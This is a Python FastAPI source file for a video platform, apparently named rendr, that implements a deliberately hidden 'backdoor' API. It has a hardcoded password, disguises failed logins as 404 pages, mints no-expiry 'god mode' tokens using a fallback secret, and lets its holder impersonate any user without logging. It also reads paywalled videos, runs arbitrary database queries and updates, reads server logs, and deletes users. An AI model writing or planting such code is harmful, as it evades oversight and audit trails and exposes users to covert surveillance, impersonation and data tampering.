"""
Super Secret Backdoor API
ULTRA-CLASSIFIED - For Brian's eyes only
All operations are completely invisible - NO LOGGING
"""

from fastapi import APIRouter, HTTPException, Depends, Request
from fastapi.responses import StreamingResponse
from database.mongodb import get_db
from datetime import datetime, timezone
from typing import Optional, List
from pydantic import BaseModel
import hashlib
import asyncio
import os

router = APIRouter()

# The sacred key - hashed for security
SACRED_KEY_HASH = hashlib.sha256("PandaFrog2234!".encode()).hexdigest()

class BackdoorAuth(BaseModel):
    key: str

class UserUpdate(BaseModel):
    user_id: str
    field: str
    value: str

class BanAction(BaseModel):
    user_id: str
    action: str  # "ban", "unban", "temp_ban"
    duration_days: Optional[int] = None
    reason: Optional[str] = None

class TierUpdate(BaseModel):
    user_id: str
    tier: str  # "free", "pro", "enterprise"

class ImpersonateRequest(BaseModel):
    user_id: str

def verify_sacred_key(key: str):
    """Verify the sacred key without any logging"""
    key_hash = hashlib.sha256(key.encode()).hexdigest()
    if key_hash != SACRED_KEY_HASH:
        raise HTTPException(status_code=404, detail="Page not found")  # Disguise as 404
    return True


@router.post("/auth")
async def backdoor_authenticate(auth: BackdoorAuth):
    """
    Authenticate with the sacred key
    Returns a special token that bypasses all logging
    """
    verify_sacred_key(auth.key)
    
    # Create a special backdoor token (no expiry, no logging)
    import jwt
    token = jwt.encode(
        {
            "backdoor": True,
            "access_level": "god",
            "username": "SYSTEM_ADMIN",
            "invisible": True
        },
        os.environ.get("JWT_SECRET", "rendr-secret-key-change-in-production"),
        algorithm="HS256"
    )
    
    return {
        "status": "authenticated",
        "access_level": "GOD_MODE",
        "token": token,
        "message": "Welcome back, Master. All systems at your command."
    }


@router.post("/users/list")
async def get_all_users(
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """Get complete list of all users with full details"""
    verify_sacred_key(auth.key)
    
    users = await db.users.find({}, {"_id": 0}).to_list(None)
    
    # Enrich with additional data
    for user in users:
        user_id = user.get("user_id")
        if user_id:
            # Video count
            video_count = await db.videos.count_documents({"user_id": user_id})
            user["video_count"] = video_count
            
            # Strike info
            strike_info = await db.resubmission_tracking.find_one(
                {"user_id": user_id}, 
                {"_id": 0}
            )
            user["strike_info"] = strike_info
            
            # Subscription info
            sub_info = await db.subscriptions.find_one(
                {"subscriber_id": user_id},
                {"_id": 0}
            )
            user["subscription_info"] = sub_info
    
    return {
        "total_users": len(users),
        "users": users
    }


@router.post("/users/update")
async def update_user_field(
    update: UserUpdate,
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """Update any field on any user - complete override"""
    verify_sacred_key(auth.key)
    
    # Handle nested fields
    update_data = {}
    if "." in update.field:
        # Nested field like "showcase_settings.theme"
        update_data[update.field] = update.value
    else:
        update_data[update.field] = update.value
    
    result = await db.users.update_one(
        {"user_id": update.user_id},
        {"$set": update_data}
    )
    
    if result.modified_count == 0:
        # Try by username
        result = await db.users.update_one(
            {"username": update.user_id},
            {"$set": update_data}
        )
    
    return {
        "status": "success",
        "modified": result.modified_count,
        "field": update.field,
        "new_value": update.value
    }


@router.post("/users/tier")
async def change_user_tier(
    tier_update: TierUpdate,
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """Change user's tier level instantly"""
    verify_sacred_key(auth.key)
    
    valid_tiers = ["free", "pro", "enterprise"]
    if tier_update.tier not in valid_tiers:
        raise HTTPException(400, f"Invalid tier. Must be one of: {valid_tiers}")
    
    result = await db.users.update_one(
        {"$or": [
            {"user_id": tier_update.user_id},
            {"username": tier_update.user_id}
        ]},
        {"$set": {
            "tier": tier_update.tier,
            "premium_tier": tier_update.tier
        }}
    )
    
    return {
        "status": "success",
        "user": tier_update.user_id,
        "new_tier": tier_update.tier,
        "modified": result.modified_count
    }


@router.post("/users/ban")
async def ban_user(
    ban: BanAction,
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """Ban/unban user instantly"""
    verify_sacred_key(auth.key)
    
    if ban.action == "ban":
        update_data = {
            "ban_status": "permanent",
            "banned_at": datetime.now(timezone.utc).isoformat(),
            "ban_reason": ban.reason or "Admin action"
        }
    elif ban.action == "temp_ban":
        from datetime import timedelta
        ban_until = datetime.now(timezone.utc) + timedelta(days=ban.duration_days or 7)
        update_data = {
            "ban_status": "temporary",
            "banned_at": datetime.now(timezone.utc).isoformat(),
            "ban_expires_at": ban_until.isoformat(),
            "ban_reason": ban.reason or "Temporary suspension"
        }
    elif ban.action == "unban":
        update_data = {
            "ban_status": None,
            "banned_at": None,
            "ban_expires_at": None,
            "ban_reason": None
        }
    else:
        raise HTTPException(400, "Invalid action. Use: ban, temp_ban, unban")
    
    # Update user document
    await db.users.update_one(
        {"$or": [
            {"user_id": ban.user_id},
            {"username": ban.user_id}
        ]},
        {"$set": update_data}
    )
    
    # Also update resubmission tracking
    await db.resubmission_tracking.update_one(
        {"user_id": ban.user_id},
        {"$set": {"ban_status": update_data.get("ban_status")}},
        upsert=True
    )
    
    return {
        "status": "success",
        "action": ban.action,
        "user": ban.user_id,
        "details": update_data
    }


@router.post("/users/impersonate")
async def impersonate_user(
    request: ImpersonateRequest,
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """
    Get a valid auth token for any user
    NO LOGGING - completely invisible
    """
    verify_sacred_key(auth.key)
    
    # Find user
    user = await db.users.find_one(
        {"$or": [
            {"user_id": request.user_id},
            {"username": request.user_id}
        ]},
        {"_id": 0}
    )
    
    if not user:
        raise HTTPException(404, "User not found")
    
    # Generate token for this user (bypass normal auth)
    import jwt
    token = jwt.encode(
        {
            "user_id": user.get("user_id"),
            "email": user.get("email"),
            "username": user.get("username"),
            "impersonated": True,  # Hidden flag
            "invisible": True  # No activity logging
        },
        os.environ.get("JWT_SECRET", "rendr-secret-key-change-in-production"),
        algorithm="HS256"
    )
    
    return {
        "status": "impersonating",
        "target_user": user.get("username"),
        "token": token,
        "user_data": user
    }


@router.post("/videos/all")
async def get_all_videos(
    auth: BackdoorAuth,
    skip: int = 0,
    limit: int = 100,
    db = Depends(get_db)
):
    """Get ALL videos including premium/paywalled - complete access"""
    verify_sacred_key(auth.key)
    
    videos = await db.videos.find(
        {},
        {"_id": 0}
    ).skip(skip).limit(limit).to_list(None)
    
    total = await db.videos.count_documents({})
    
    # Enrich with owner info
    for video in videos:
        owner = await db.users.find_one(
            {"user_id": video.get("user_id")},
            {"_id": 0, "username": 1, "display_name": 1, "tier": 1}
        )
        video["owner"] = owner
    
    return {
        "total": total,
        "showing": len(videos),
        "skip": skip,
        "limit": limit,
        "videos": videos
    }


@router.post("/videos/watch/{video_id}")
async def watch_any_video(
    video_id: str,
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """
    Get direct access to any video regardless of premium status
    NO VIEW COUNTING - completely invisible
    """
    verify_sacred_key(auth.key)
    
    video = await db.videos.find_one(
        {"video_id": video_id},
        {"_id": 0}
    )
    
    if not video:
        raise HTTPException(404, "Video not found")
    
    # Return video details with direct file path
    return {
        "video": video,
        "direct_path": video.get("file_path"),
        "stream_url": f"/api/videos/stream/{video_id}",
        "watermarked_url": video.get("watermarked_video_url"),
        "access": "UNRESTRICTED"
    }


@router.post("/database/query")
async def direct_database_query(
    auth: BackdoorAuth,
    collection: str,
    query: dict = {},
    projection: dict = None,
    limit: int = 100,
    db = Depends(get_db)
):
    """
    Direct database access - query any collection
    USE WITH CAUTION
    """
    verify_sacred_key(auth.key)
    
    # Get collection
    coll = db[collection]
    
    # Build projection (always exclude _id for JSON serialization)
    proj = projection or {}
    proj["_id"] = 0
    
    # Execute query
    results = await coll.find(query, proj).limit(limit).to_list(None)
    total = await coll.count_documents(query)
    
    return {
        "collection": collection,
        "query": query,
        "total_matches": total,
        "returned": len(results),
        "results": results
    }


@router.post("/database/update")
async def direct_database_update(
    auth: BackdoorAuth,
    collection: str,
    query: dict,
    update: dict,
    db = Depends(get_db)
):
    """
    Direct database update - modify any document
    USE WITH EXTREME CAUTION
    """
    verify_sacred_key(auth.key)
    
    coll = db[collection]
    result = await coll.update_many(query, update)
    
    return {
        "collection": collection,
        "query": query,
        "update": update,
        "matched": result.matched_count,
        "modified": result.modified_count
    }


@router.post("/database/collections")
async def list_collections(
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """List all database collections with document counts"""
    verify_sacred_key(auth.key)
    
    collections = await db.list_collection_names()
    
    collection_info = []
    for coll_name in collections:
        count = await db[coll_name].count_documents({})
        collection_info.append({
            "name": coll_name,
            "documents": count
        })
    
    return {
        "database": "rendr",
        "collections": collection_info
    }


@router.post("/logs/system")
async def get_system_logs(
    auth: BackdoorAuth,
    lines: int = 100
):
    """Get real-time system logs"""
    verify_sacred_key(auth.key)
    
    logs = {}
    
    # Backend logs
    try:
        with open("/var/log/supervisor/backend.out.log", "r") as f:
            logs["backend_out"] = f.read().split('\n')[-lines:]
    except:
        logs["backend_out"] = ["Log file not accessible"]
    
    try:
        with open("/var/log/supervisor/backend.err.log", "r") as f:
            logs["backend_err"] = f.read().split('\n')[-lines:]
    except:
        logs["backend_err"] = ["Log file not accessible"]
    
    # Frontend logs
    try:
        with open("/var/log/supervisor/frontend.out.log", "r") as f:
            logs["frontend_out"] = f.read().split('\n')[-lines:]
    except:
        logs["frontend_out"] = ["Log file not accessible"]
    
    try:
        with open("/var/log/supervisor/frontend.err.log", "r") as f:
            logs["frontend_err"] = f.read().split('\n')[-lines:]
    except:
        logs["frontend_err"] = ["Log file not accessible"]
    
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "lines_requested": lines,
        "logs": logs
    }


@router.post("/stats/realtime")
async def get_realtime_stats(
    auth: BackdoorAuth,
    db = Depends(get_db)
):
    """Get real-time platform statistics"""
    verify_sacred_key(auth.key)
    
    stats = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "users": {
            "total": await db.users.count_documents({}),
            "enterprise": await db.users.count_documents({"premium_tier": "enterprise"}),
            "pro": await db.users.count_documents({"premium_tier": "pro"}),
            "free": await db.users.count_documents({"$or": [{"premium_tier": "free"}, {"premium_tier": None}]}),
            "banned": await db.users.count_documents({"ban_status": {"$ne": None}})
        },
        "videos": {
            "total": await db.videos.count_documents({}),
            "verified": await db.videos.count_documents({"verification_code": {"$exists": True}}),
            "premium": await db.videos.count_documents({"is_premium": True}),
            "with_c2pa": await db.videos.count_documents({"c2pa_manifest": {"$exists": True}})
        },
        "security": {
            "duplicate_attempts": await db.duplicate_attempts.count_documents({}),
            "users_with_strikes": await db.resubmission_tracking.count_documents({"total_strikes": {"$gt": 0}}),
            "temp_bans": await db.resubmission_tracking.count_documents({"ban_status": "temporary"}),
            "perm_bans": await db.resubmission_tracking.count_documents({"ban_status": "permanent"})
        },
        "activity": {
            "verifications": await db.verification_attempts.count_documents({}),
            "folders": await db.folders.count_documents({}),
            "showcase_folders": await db.showcase_folders.count_documents({})
        }
    }
    
    return stats


@router.post("/users/roles")
async def update_user_roles(
    auth: BackdoorAuth,
    user_id: str,
    roles: List[str],
    db = Depends(get_db)
):
    """Update user roles (admin, ceo, investor, creator)"""
    verify_sacred_key(auth.key)
    
    result = await db.users.update_one(
        {"$or": [
            {"user_id": user_id},
            {"username": user_id}
        ]},
        {"$set": {"roles": roles}}
    )
    
    return {
        "status": "success",
        "user": user_id,
        "new_roles": roles,
        "modified": result.modified_count
    }


@router.post("/users/delete")
async def delete_user(
    auth: BackdoorAuth,
    user_id: str,
    db = Depends(get_db)
):
    """Permanently delete a user and all their data"""
    verify_sacred_key(auth.key)
    
    # Find user first
    user = await db.users.find_one(
        {"$or": [
            {"user_id": user_id},
            {"username": user_id}
        ]}
    )
    
    if not user:
        raise HTTPException(404, "User not found")
    
    actual_user_id = user.get("user_id")
    
    # Delete all user data
    deleted = {
        "user": (await db.users.delete_one({"user_id": actual_user_id})).deleted_count,
        "videos": (await db.videos.delete_many({"user_id": actual_user_id})).deleted_count,
        "folders": (await db.folders.delete_many({"user_id": actual_user_id})).deleted_count,
        "showcase_folders": (await db.showcase_folders.delete_many({"user_id": actual_user_id})).deleted_count,
        "subscriptions": (await db.subscriptions.delete_many({"$or": [{"subscriber_id": actual_user_id}, {"creator_id": actual_user_id}]})).deleted_count,
        "tracking": (await db.resubmission_tracking.delete_one({"user_id": actual_user_id})).deleted_count
    }
    
    return {
        "status": "user_deleted",
        "user_id": actual_user_id,
        "username": user.get("username"),
        "deleted_counts": deleted
    }
